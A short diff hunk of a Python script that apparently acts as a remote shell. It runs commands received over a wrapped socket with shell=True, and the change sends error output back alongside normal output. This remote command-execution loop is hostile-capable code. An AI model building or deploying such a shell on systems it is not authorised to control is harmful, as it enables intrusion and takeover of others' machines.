@@ -65,7 +65,10 @@ try:
             command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE)
             output, err = command.communicate()
-            wrappedSocket.sendall(output)
+            if not err:
+                wrappedSocket.sendall(output)
+            else:
+                wrappedSocket.sendall(err)
 except Exception:
     exit(-1)
 finally:
